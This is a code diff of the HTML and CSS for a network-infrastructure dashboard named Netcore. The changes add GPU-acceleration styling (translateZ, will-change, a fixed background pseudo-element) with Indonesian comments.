@@ -34,6 +34,7 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
 
+        /* [OPTIMASI GPU] Menghilangkan background-attachment: fixed dari body */
         body { 
             font-family: 'Inter', sans-serif; 
             background-color: #09090b; 
@@ -42,27 +43,59 @@
             overscroll-behavior-y: none; 
             overflow-x: hidden; 
             width: 100vw;
+            position: relative;
+        }
+
+        /* [OPTIMASI GPU] Memindahkan background gradient ke layer semu agar tidak repaint saat scroll */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            z-index: -999;
+            background-color: #09090b;
             background-image: 
                 radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), 
                 radial-gradient(at 50% 0%, hsla(225,39%,30%,0.1) 0, transparent 50%), 
                 radial-gradient(at 100% 0%, hsla(339,49%,30%,0.05) 0, transparent 50%);
-            background-attachment: fixed;
+            pointer-events: none;
+            transform: translateZ(0);
         }
 
-        .glass { background: rgba(24, 24, 27, 0.6); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.08); }
-        .glass-card { background: linear-gradient(135deg, rgba(39, 39, 42, 0.4) 0%, rgba(24, 24, 27, 0.8) 100%); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3); }
-        .glass-input { background: rgba(9, 9, 11, 0.5); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); transition: all 0.3s ease; }
+        /* [OPTIMASI GPU] Menambahkan Hardware Acceleration (translateZ) pada elemen efek kaca */
+        .glass { 
+            background: rgba(24, 24, 27, 0.6); 
+            backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); 
+            border: 1px solid rgba(255, 255, 255, 0.08); 
+            transform: translateZ(0); -webkit-transform: translateZ(0);
+            backface-visibility: hidden; -webkit-backface-visibility: hidden;
+        }
+        .glass-card { 
+            background: linear-gradient(135deg, rgba(39, 39, 42, 0.4) 0%, rgba(24, 24, 27, 0.8) 100%); 
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); 
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3); 
+            transform: translateZ(0); -webkit-transform: translateZ(0);
+            backface-visibility: hidden; -webkit-backface-visibility: hidden;
+        }
+        .glass-input { 
+            background: rgba(9, 9, 11, 0.5); 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+            transition: all 0.3s ease; 
+            transform: translateZ(0); -webkit-transform: translateZ(0);
+        }
         .glass-input:focus { border-color: rgba(59, 130, 246, 0.5); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); background: rgba(9, 9, 11, 0.8); }
 
         .scrollbar-hide::-webkit-scrollbar { display: none; }
         .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
         
-        @keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-        @keyframes slideOutRight { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }
-        @keyframes pulse-glow { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: .8; transform: scale(1.05); } }
+        /* [OPTIMASI GPU] Menambahkan translateZ pada animasi CSS */
+        @keyframes slideInRight { from { transform: translateX(100%) translateZ(0); opacity: 0; } to { transform: translateX(0) translateZ(0); opacity: 1; } }
+        @keyframes slideOutRight { from { transform: translateX(0) translateZ(0); opacity: 1; } to { transform: translateX(100%) translateZ(0); opacity: 0; } }
+        @keyframes pulse-glow { 0%, 100% { opacity: 1; transform: scale(1) translateZ(0); } 50% { opacity: .8; transform: scale(1.05) translateZ(0); } }
 
-        .toast-enter { animation: slideInRight 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
-        .toast-exit { animation: slideOutRight 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        .toast-enter { animation: slideInRight 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; will-change: transform, opacity; }
+        .toast-exit { animation: slideOutRight 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; will-change: transform, opacity; }
         
         .pb-safe { padding-bottom: calc(env(safe-area-inset-bottom, 20px) + 120px); }
         .pt-safe { padding-top: env(safe-area-inset-top, 0px); }
@@ -75,14 +108,14 @@
 
     <!-- Halaman Login -->
     <div id="loginPage" class="min-h-screen flex items-center justify-center p-6 w-full relative overflow-hidden">
-        <div class="absolute top-[10%] left-[10%] w-72 h-72 bg-brand-500/20 rounded-full blur-[80px] -z-10 animate-[pulse-glow_8s_ease-in-out_infinite]"></div>
-        <div class="absolute bottom-[10%] right-[10%] w-72 h-72 bg-accent-500/10 rounded-full blur-[80px] -z-10 animate-[pulse-glow_10s_ease-in-out_infinite_reverse]"></div>
+        <div class="absolute top-[10%] left-[10%] w-72 h-72 bg-brand-500/20 rounded-full blur-[80px] -z-10 animate-[pulse-glow_8s_ease-in-out_infinite] will-change-transform"></div>
+        <div class="absolute bottom-[10%] right-[10%] w-72 h-72 bg-accent-500/10 rounded-full blur-[80px] -z-10 animate-[pulse-glow_10s_ease-in-out_infinite_reverse] will-change-transform"></div>
         
         <div class="glass p-8 md:p-10 rounded-3xl w-full max-w-md shadow-2xl relative overflow-hidden">
             <div class="absolute top-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-white/20 to-transparent"></div>
             
             <div class="text-center mb-10">
-                <div class="w-20 h-20 bg-gradient-to-tr from-brand-500 to-indigo-600 rounded-2xl mx-auto flex items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.4)] mb-6 transform rotate-3">
+                <div class="w-20 h-20 bg-gradient-to-tr from-brand-500 to-indigo-600 rounded-2xl mx-auto flex items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.4)] mb-6 transform rotate-3 will-change-transform">
                     <i class="fa-solid fa-fingerprint text-4xl text-white transform -rotate-3"></i>
                 </div>
                 <h2 class="text-3xl font-black tracking-tight text-white mb-1">NETCORE</h2>
@@ -105,9 +138,9 @@
                     </div>
                 </div>
                 
-                <div id="loginError" class="hidden bg-red-500/10 border border-red-500/20 text-red-400 text-xs p-3 rounded-xl text-center font-medium backdrop-blur-sm"></div>
+                <div id="loginError" class="hidden bg-red-500/10 border border-red-500/20 text-red-400 text-xs p-3 rounded-xl text-center font-medium backdrop-blur-sm transform translateZ(0)"></div>
                 
-                <button type="submit" id="loginBtn" class="w-full bg-white text-dark-900 hover:bg-zinc-200 active:scale-95 font-bold py-3.5 rounded-xl transition-all shadow-[0_0_20px_rgba(255,255,255,0.1)] flex items-center justify-center gap-2 mt-6">
+                <button type="submit" id="loginBtn" class="w-full bg-white text-dark-900 hover:bg-zinc-200 active:scale-95 font-bold py-3.5 rounded-xl transition-all shadow-[0_0_20px_rgba(255,255,255,0.1)] flex items-center justify-center gap-2 mt-6 will-change-transform">
                     <span>Authenticate</span>
                     <i class="fa-solid fa-arrow-right-to-bracket text-sm"></i>
                 </button>
@@ -128,7 +161,7 @@
                     <div class="flex flex-col justify-center">
                         <h1 class="text-lg font-bold tracking-tight text-white leading-none mb-1">Netcore Dashboard</h1>
                         <div class="flex items-center gap-2">
-                            <span class="w-1.5 h-1.5 rounded-full bg-accent-500 animate-pulse"></span>
+                            <span class="w-1.5 h-1.5 rounded-full bg-accent-500 animate-pulse will-change-transform"></span>
                             <p class="text-zinc-400 text-[10px] font-medium tracking-wider uppercase leading-none">System Online</p>
                             <span id="ownerRoleBadge" class="hidden px-1.5 py-0.5 text-[8px] font-black bg-gradient-to-r from-amber-400 to-orange-500 text-black rounded-sm tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.3)]">OWNER</span>
                         </div>
@@ -136,14 +169,13 @@
                 </div>
                 
                 <div class="flex items-center gap-2 md:gap-3">
-                    <!-- Tombol Tracker Team (Hanya Owner) -->
-                    <button id="btnTeamTracker" onclick="openTrackerModal()" class="hidden w-10 h-10 rounded-full glass flex items-center justify-center text-emerald-400 hover:text-white active:scale-90 transition-all border border-emerald-500/30 bg-emerald-500/10 shadow-[0_0_10px_rgba(16,185,129,0.2)]" title="Team Location Tracker">
+                    <button id="btnTeamTracker" onclick="openTrackerModal()" class="hidden w-10 h-10 rounded-full glass flex items-center justify-center text-emerald-400 hover:text-white active:scale-90 transition-all border border-emerald-500/30 bg-emerald-500/10 shadow-[0_0_10px_rgba(16,185,129,0.2)] will-change-transform" title="Team Location Tracker">
                         <i class="fa-solid fa-location-crosshairs"></i>
                     </button>
-                    <button id="btnActivityLog" onclick="openActivityLogModal()" class="hidden w-10 h-10 rounded-full glass flex items-center justify-center text-blue-400 hover:text-white active:scale-90 transition-all border border-blue-500/30 bg-blue-500/10 shadow-[0_0_10px_rgba(59,130,246,0.2)]" title="Activity Logs">
+                    <button id="btnActivityLog" onclick="openActivityLogModal()" class="hidden w-10 h-10 rounded-full glass flex items-center justify-center text-blue-400 hover:text-white active:scale-90 transition-all border border-blue-500/30 bg-blue-500/10 shadow-[0_0_10px_rgba(59,130,246,0.2)] will-change-transform" title="Activity Logs">
                         <i class="fa-solid fa-clock-rotate-left"></i>
                     </button>
-                    <button onclick="refreshDashboardStats()" class="w-10 h-10 rounded-full glass flex items-center justify-center text-zinc-300 hover:text-white active:scale-90 transition-all border border-zinc-700/50">
+                    <button onclick="refreshDashboardStats()" class="w-10 h-10 rounded-full glass flex items-center justify-center text-zinc-300 hover:text-white active:scale-90 transition-all border border-zinc-700/50 will-change-transform">
                         <i id="syncIcon" class="fa-solid fa-rotate-right"></i>
                     </button>
                     <button onclick="handleLogout()" class="flex items-center gap-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 px-3 py-2 md:px-4 rounded-full transition-colors font-medium text-sm">
@@ -168,17 +200,17 @@
                             System Overview
                         </h3>
                         <div class="flex items-center gap-2 text-[10px] text-zinc-400 font-medium bg-dark-800/80 px-3 py-1.5 rounded-full border border-zinc-700/50">
-                            <span>Tap to hide/show</span><i id="recapChevron" class="fa-solid fa-chevron-up transition-transform duration-300"></i>
+                            <span>Tap to hide/show</span><i id="recapChevron" class="fa-solid fa-chevron-up transition-transform duration-300 will-change-transform"></i>
                         </div>
                     </div>
                     
                     <div id="detailedStats" class="grid grid-cols-1 md:grid-cols-3 gap-3 md:gap-5 text-sm w-full relative z-10">
-                        <div class="animate-pulse bg-zinc-800/50 h-16 rounded-2xl border border-zinc-700/30"></div>
-                        <div class="animate-pulse bg-zinc-800/50 h-16 rounded-2xl border border-zinc-700/30"></div>
-                        <div class="animate-pulse bg-zinc-800/50 h-16 rounded-2xl border border-zinc-700/30"></div>
+                        <div class="animate-pulse bg-zinc-800/50 h-16 rounded-2xl border border-zinc-700/30 will-change-transform"></div>
+                        <div class="animate-pulse bg-zinc-800/50 h-16 rounded-2xl border border-zinc-700/30 will-change-transform"></div>
+                        <div class="animate-pulse bg-zinc-800/50 h-16 rounded-2xl border border-zinc-700/30 will-change-transform"></div>
                     </div>
                     
-                    <div id="recapDropdownPanel" class="mt-5 pt-5 border-t border-zinc-800 transition-all duration-300 w-full relative z-10 hidden opacity-0 translate-y-2"></div>
+                    <div id="recapDropdownPanel" class="mt-5 pt-5 border-t border-zinc-800 transition-all duration-300 w-full relative z-10 hidden opacity-0 translate-y-2 will-change-transform"></div>
                 </div>
             </div>
 
@@ -188,7 +220,7 @@
                 </div>
                 
                 <div class="grid grid-cols-2 md:grid-cols-5 gap-4">
-                    <button onclick="openDatabaseModal('All')" class="col-span-2 md:col-span-1 bg-gradient-to-br from-brand-500 to-indigo-600 active:scale-95 text-white p-5 rounded-3xl font-bold transition-transform shadow-neon-blue flex flex-row md:flex-col items-center justify-between md:justify-center border border-white/10 relative overflow-hidden group">
+                    <button onclick="openDatabaseModal('All')" class="col-span-2 md:col-span-1 bg-gradient-to-br from-brand-500 to-indigo-600 active:scale-95 text-white p-5 rounded-3xl font-bold transition-transform shadow-neon-blue flex flex-row md:flex-col items-center justify-between md:justify-center border border-white/10 relative overflow-hidden group will-change-transform">
                         <div class="absolute inset-0 bg-white/20 transform -skew-x-12 -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]"></div>
                         <div class="flex items-center gap-4 md:flex-col md:gap-3">
                             <div class="w-12 h-12 bg-white/20 rounded-2xl backdrop-blur-sm flex items-center justify-center"><i class="fa-solid fa-layer-group text-2xl"></i></div>
@@ -196,22 +228,22 @@
                         </div>
                     </button>
                     
-                    <button onclick="openDatabaseModal('OLT')" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group">
+                    <button onclick="openDatabaseModal('OLT')" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group will-change-transform">
                         <div class="w-10 h-10 rounded-full bg-purple-500/20 flex items-center justify-center border border-purple-500/30 group-hover:scale-110 transition-transform"><i class="fa-solid fa-server text-purple-400"></i></div>
                         <div><span class="block text-xs font-bold">Data OLT</span><span class="text-[9px] text-zinc-500">Optical Terminals</span></div>
                     </button>
                     
-                    <button onclick="openDatabaseModal('Switch')" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group">
+                    <button onclick="openDatabaseModal('Switch')" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group will-change-transform">
                         <div class="w-10 h-10 rounded-full bg-blue-500/20 flex items-center justify-center border border-blue-500/30 group-hover:scale-110 transition-transform"><i class="fa-solid fa-random text-blue-400"></i></div>
                         <div><span class="block text-xs font-bold">Data Switch</span><span class="text-[9px] text-zinc-500">Network Switches</span></div>
                     </button>
                     
-                    <button onclick="openDatabaseModal('Backbone')" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group">
+                    <button onclick="openDatabaseModal('Backbone')" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group will-change-transform">
                         <div class="w-10 h-10 rounded-full bg-orange-500/20 flex items-center justify-center border border-orange-500/30 group-hover:scale-110 transition-transform"><i class="fa-solid fa-route text-orange-400"></i></div>
                         <div><span class="block text-xs font-bold">Backbone</span><span class="text-[9px] text-zinc-500">Core Routes</span></div>
                     </button>
 
-                    <button onclick="openMapModal()" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group">
+                    <button onclick="openMapModal()" class="glass-card hover:bg-zinc-800/80 active:scale-95 text-white p-4 rounded-3xl transition-all flex flex-col items-start justify-between gap-3 group will-change-transform">
                         <div class="w-10 h-10 rounded-full bg-emerald-500/20 flex items-center justify-center border border-emerald-500/30 group-hover:scale-110 transition-transform"><i class="fa-solid fa-map-location-dot text-emerald-400"></i></div>
                         <div><span class="block text-xs font-bold">Peta Backbone</span><span class="text-[9px] text-zinc-500">Live Maps BBDM</span></div>
                     </button>
@@ -220,17 +252,17 @@
         </div>
 
         <div class="fixed bottom-0 left-0 right-0 z-[90] nav-safe pt-2 md:hidden">
-            <div class="mx-4 bg-dark-800/80 backdrop-blur-xl border border-white/10 shadow-[0_8px_32px_rgba(0,0,0,0.5)] rounded-3xl p-1 flex justify-between items-center relative">
-                <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-brand-400 transition-transform active:scale-90">
+            <div class="mx-4 bg-dark-800/80 backdrop-blur-xl border border-white/10 shadow-[0_8px_32px_rgba(0,0,0,0.5)] rounded-3xl p-1 flex justify-between items-center relative transform translateZ(0)">
+                <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-brand-400 transition-transform active:scale-90 will-change-transform">
                     <i class="fa-solid fa-house mb-1 text-lg"></i><span class="text-[10px] font-semibold tracking-wide">Home</span>
                 </button>
-                <button onclick="toggleInputModal()" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-zinc-500 hover:text-accent-400 transition-colors active:scale-90">
+                <button onclick="toggleInputModal()" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-zinc-500 hover:text-accent-400 transition-colors active:scale-90 will-change-transform">
                     <i class="fa-solid fa-square-plus mb-1 text-lg"></i><span class="text-[10px] font-medium tracking-wide">Add Node</span>
                 </button>
-                <button onclick="toggleEWOModal()" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-zinc-500 hover:text-amber-400 transition-colors active:scale-90">
+                <button onclick="toggleEWOModal()" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-zinc-500 hover:text-amber-400 transition-colors active:scale-90 will-change-transform">
                     <i class="fa-solid fa-file-signature mb-1 text-lg"></i><span class="text-[10px] font-medium tracking-wide">EWO Form</span>
                 </button>
-                <button onclick="toggleOTDRModal()" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-zinc-500 hover:text-purple-400 transition-colors active:scale-90">
+                <button onclick="toggleOTDRModal()" class="relative z-10 flex flex-col items-center justify-center w-1/4 py-3 text-zinc-500 hover:text-purple-400 transition-colors active:scale-90 will-change-transform">
                     <i class="fa-solid fa-chart-area mb-1 text-lg"></i><span class="text-[10px] font-medium tracking-wide">OTDR Data</span>
                 </button>
             </div>
@@ -238,11 +270,11 @@
     </div>
 
     <!-- Modals Database -->
-    <div id="databaseModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="databaseModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-[1400px] md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[85vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="databaseModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="databaseModalContent" class="bg-dark-900 w-full md:w-[95%] md:max-w-[1400px] md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col h-[85vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="w-full flex justify-center pt-3 pb-2 md:hidden"><div class="w-12 h-1.5 bg-zinc-700 rounded-full"></div></div>
             
-            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20">
+            <div class="px-5 py-4 border-b border-zinc-800/50 flex justify-between items-center bg-dark-900/90 backdrop-blur-md sticky top-0 z-20 transform translateZ(0)">
                 <div class="flex items-center gap-3">
                     <div class="w-8 h-8 rounded-full bg-brand-500/20 flex items-center justify-center border border-brand-500/30"><i class="fa-solid fa-database text-brand-400 text-sm"></i></div>
                     <h3 id="databaseModalTitle" class="text-white text-base font-bold tracking-wide">Database</h3>
@@ -258,7 +290,7 @@
                         <i class="fa-solid fa-file-csv"></i> 
                         <span class="hidden md:inline">Export CSV</span>
                     </button>
-                    <button onclick="closeDatabaseModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+                    <button onclick="closeDatabaseModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i class="fa-solid fa-xmark text-lg"></i></button>
                 </div>
             </div>
             
@@ -278,7 +310,7 @@
                 </div>
                 <div class="text-[10px] text-zinc-500 pl-1">Showing max 50 recent records.</div>
                 
-                <div class="rounded-2xl relative flex-1 flex flex-col w-full h-full pb-10 bg-dark-800/30 border border-zinc-800/50 p-2 md:p-4 overflow-hidden">
+                <div class="rounded-2xl relative flex-1 flex flex-col w-full h-full pb-10 bg-dark-800/30 border border-zinc-800/50 p-2 md:p-4 overflow-hidden transform translateZ(0)">
                     <div id="data-list-container" class="w-full h-full overflow-y-auto space-y-3 scrollbar-hide md:grid md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 md:gap-4 md:space-y-0 content-start pb-8"></div>
                     <div id="emptyState" class="hidden absolute inset-0 flex flex-col items-center justify-center p-6 text-center text-zinc-500 h-full w-full bg-dark-900/80 backdrop-blur-sm z-10">
                         <div class="w-16 h-16 rounded-full bg-zinc-800 flex items-center justify-center mb-4"><i class="fa-solid fa-ghost text-2xl opacity-50 text-brand-400"></i></div>
@@ -290,15 +322,15 @@
     </div>
 
     <!-- Modal Input -->
-    <div id="inputModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="inputModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="inputModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="inputModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="w-full flex justify-center pt-3 pb-2 md:hidden bg-dark-900"><div class="w-12 h-1.5 bg-zinc-700 rounded-full"></div></div>
             <div class="px-6 py-4 flex justify-between items-center bg-dark-900 border-b border-zinc-800 shrink-0">
                 <div class="flex items-center gap-3">
                     <div class="w-8 h-8 rounded-full bg-accent-500/20 flex items-center justify-center border border-accent-500/30"><i class="fa-solid fa-server text-accent-400 text-sm"></i></div>
                     <h3 class="text-white text-base font-bold tracking-wide">Register Node</h3>
                 </div>
-                <button onclick="toggleInputModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i class="fa-solid fa-xmark"></i></button>
+                <button onclick="toggleInputModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i class="fa-solid fa-xmark"></i></button>
             </div>
             <div class="p-6 overflow-y-auto scrollbar-hide flex-1 bg-dark-900">
                 <form id="manualInputForm" onsubmit="handleInputData(event)" class="grid grid-cols-1 md:grid-cols-2 gap-5 pb-6">
@@ -342,7 +374,7 @@
                         </select>
                     </div>
                     <div class="md:col-span-2 pt-4">
-                        <button type="submit" id="submitInputBtn" class="w-full bg-accent-500 hover:bg-accent-400 text-dark-900 active:scale-95 font-bold py-4 rounded-xl transition shadow-neon-green flex items-center justify-center gap-2 text-sm">
+                        <button type="submit" id="submitInputBtn" class="w-full bg-accent-500 hover:bg-accent-400 text-dark-900 active:scale-95 font-bold py-4 rounded-xl transition shadow-neon-green flex items-center justify-center gap-2 text-sm will-change-transform">
                             <i class="fa-solid fa-cloud-arrow-up"></i> Save to Database
                         </button>
                     </div>
@@ -352,8 +384,8 @@
     </div>
 
     <!-- Modal EWO -->
-    <div id="ewoModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="ewoModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="ewoModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="ewoModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="w-full flex justify-center pt-3 pb-2 md:hidden bg-dark-900"><div class="w-12 h-1.5 bg-zinc-700 rounded-full"></div></div>
             <div class="px-6 py-4 flex justify-between items-center bg-dark-900 border-b border-zinc-800 shrink-0">
                 <div class="flex items-center gap-3">
@@ -366,7 +398,7 @@
                         <i class="fa-solid fa-file-excel text-emerald-400"></i> 
                         <span class="hidden md:inline">Export Excel</span>
                     </button>
-                    <button onclick="toggleEWOModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i class="fa-solid fa-xmark"></i></button>
+                    <button onclick="toggleEWOModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i class="fa-solid fa-xmark"></i></button>
                 </div>
             </div>
             <div class="p-6 overflow-y-auto scrollbar-hide flex-1 bg-dark-900 pb-safe">
@@ -387,7 +419,7 @@
                             <input type="text" id="deskEwo" required class="w-full glass-input rounded-xl p-3 text-sm text-white focus:border-amber-500 outline-none" placeholder="Describe task...">
                         </div>
                     </div>
-                    <button type="submit" id="submitEwoBtn" class="w-full mt-2 bg-gradient-to-r from-amber-500 to-orange-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition shadow-[0_0_15px_rgba(245,158,11,0.4)] flex items-center justify-center gap-2 text-sm">
+                    <button type="submit" id="submitEwoBtn" class="w-full mt-2 bg-gradient-to-r from-amber-500 to-orange-500 text-black active:scale-95 font-bold py-3.5 rounded-xl transition shadow-[0_0_15px_rgba(245,158,11,0.4)] flex items-center justify-center gap-2 text-sm will-change-transform">
                         <i class="fa-solid fa-plus"></i> Create EWO
                     </button>
                 </form>
@@ -401,15 +433,15 @@
     </div>
 
     <!-- Modal OTDR -->
-    <div id="otdrModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full">
-        <div id="otdrModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out">
+    <div id="otdrModal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-end md:justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 opacity-0 w-full h-full transform translateZ(0)">
+        <div id="otdrModalContent" class="bg-dark-900 w-full md:max-w-xl md:rounded-3xl rounded-t-[32px] shadow-[0_-20px_50px_rgba(0,0,0,0.8)] overflow-hidden border-t border-zinc-800 md:border flex flex-col max-h-[90vh] transform translate-y-full transition-transform duration-300 ease-out will-change-transform">
             <div class="w-full flex justify-center pt-3 pb-2 md:hidden bg-dark-900"><div class="w-12 h-1.5 bg-zinc-700 rounded-full"></div></div>
             <div class="px-6 py-4 flex justify-between items-center bg-dark-900 border-b border-zinc-800 shrink-0">
                 <div class="flex items-center gap-3">
                     <div class="w-8 h-8 rounded-full bg-purple-500/20 flex items-center justify-center border border-purple-500/30"><i class="fa-solid fa-chart-area text-purple-400 text-sm"></i></div>
                     <h3 class="text-white text-base font-bold tracking-wide">OTDR Uploads</h3>
                 </div>
-                <button onclick="toggleOTDRModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition"><i class="fa-solid fa-xmark"></i></button>
+                <button onclick="toggleOTDRModal()" class="w-8 h-8 bg-zinc-800 rounded-full flex justify-center items-center text-zinc-400 hover:text-white hover:bg-zinc-700 active:scale-90 transition will-change-transform"><i class="fa-solid fa-xmark"></i></button>
             </div>
             
             <div class="p-6 overflow-y-auto scrollbar-hide flex-1 bg-dark-900 pb-safe">
@@ -439,12 +471,12 @@
                                     <span class="text-xs text-zinc-500">Pilih file ber-ekstensi .sor</span>
                                 </div>
                                 
-                                <div id="fileUploadList" class="hidden absolute inset-0 bg-dark-800/90 z-10 p-3 overflow-y-auto w-full h-full text-left scrollbar-hide flex flex-col backdrop-blur-sm pointer-events-none">
+                                <div id="fileUploadList" class="hidden absolute inset-0 bg-dark-800/90 z-10 p-3 overflow-y-auto w-full h-full text-left scrollbar-hide flex flex-col backdrop-blur-sm pointer-events-none transform translateZ(0)">
                                 </div>
                             </div>
                         </div>
                     </div>
-                    <button type="submit" id="submitOtdrBtn" class="w-full mt-2 bg-gradient-to-r from-purple-600 to-indigo-600 active:scale-95 text-white font-bold py-3.5 rounded-xl transition shadow-[0_0_15px_rgba(147,51,234,0.4)] flex items-center justify-center gap-2 text-sm">
